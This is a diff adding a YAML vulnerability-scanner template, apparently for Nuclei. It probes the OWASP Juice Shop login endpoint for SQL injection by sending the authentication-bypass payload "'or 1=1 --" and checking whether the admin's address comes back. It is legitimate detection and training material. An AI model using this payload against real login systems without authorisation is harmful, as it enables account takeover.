@@ -1,0 +1,25 @@
+id: A03-2021-Injection
+info:
+  name: Juice Shop Login SQLi detection
+  author: cjhackerz
+  severity: high
+  description: This template detects SQLi on owasp juice shop login page
+  reference:
+    - https://owasp.org/www-community/attacks/SQL_Injection
+  tags: demo
+requests:
+  - method: POST
+    path:
+      - "{{BaseURL}}/rest/user/login"
+    headers:
+      Accept: application/json, text/plain, */*
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.178 Safari/537.36
+      Content-Type: application/json
+      Cookie: language=en; welcomebanner_status=dismiss
+    body: "{\"email\":\"'or 1=1 --\",\"password\":\"test\"}"
+    
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '"umail":"admin@juice-sh.op"'
